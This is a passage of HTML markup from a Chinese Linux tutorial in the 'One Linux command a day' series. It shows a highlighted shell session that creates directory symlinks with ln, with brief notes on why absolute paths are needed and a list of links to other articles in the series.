&lt;span class=&quot;crayon-i&quot;&gt;lrwxrwxrwx&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;57&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-13&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test3&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt; 符号连接的层数过多&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-17&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-19&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-21&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-23&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;lrwxrwxrwx&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;57&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-25&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# rm -rf test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-27&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-29&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ln -sv /opt/soft/test/test3 /opt/soft/test/test5&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-30&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-31&quot;&gt;创建指向“&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;soft&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt;”的符号链接“&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;soft&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt;”&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-32&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-33&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-35&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;lrwxrwxrwx&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;59&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;soft&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-36&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-37&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-38&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-39&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-40&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-41&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-42&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-43&quot;&gt;总计 &lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-44&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-45&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;36&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-46&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-47&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# touch log2014.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-48&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-49&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-50&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-51&quot;&gt;总计 &lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-52&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-53&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;36&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-54&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-55&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;05&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-56&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-57&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd ..&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3935a645316559-58&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3935a645316559-59&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd ..&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0078 seconds] --&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;1.目录只能创建软链接&lt;/p&gt;
&lt;p&gt;2.目录创建链接必须用绝对路径，相对路径创建会不成功，会提示：符号连接的层数过多 这样的错误&lt;/p&gt;
&lt;p&gt;3.在链接目标目录中修改文件都会在源文件目录中同步变化&lt;/p&gt;
&lt;h3&gt;本系列文章：&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.jobbole.com/108531/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（1）：ls命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108805/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（2）：cd命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108855/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（3）：pwd命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108871/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（4）：mkdir命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108901/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（5）：rm 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108925/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（6）：rmdir 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108983/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（7）：mv命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108988/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（8）：cp 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108989/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（9）：touch 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108990/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（10）：cat 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108991/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（11）：nl 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108992/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（12）：more 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108993/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（13）：less 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108994/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（14）：head 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108995/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（15）：tail 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109262/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（16）：which命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108993/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（17）：whereis 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108994/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（18）：locate 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109265/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（19）：find 命令概览&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108996/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（20）：find命令之exec&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/108997/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（21）：find命令之xargs&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109268/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（22）：find 命令的参数详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109506/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（23）：Linux 目录结构&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109254/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（24）：Linux 文件类型与扩展名&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/105269&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（25）：Linux 文件属性详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109539&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（26）：用 SecureCRT 来上传和下载文件&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109614&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（27）：linux chmod 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109674/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（28）：tar 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109696/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（29）: chgrp 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109750/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（30）: chown 命令&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109781/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（31）: /etc/group 文件详解&lt;/a&gt;&lt;br&gt;
&lt;a href=&quot;http://blog.jobbole.com/109797/&quot; target=&quot;_blank&quot;&gt;每天一个 Linux 命令（32）：gzip 命令&lt;/a&gt;&lt;br&gt;
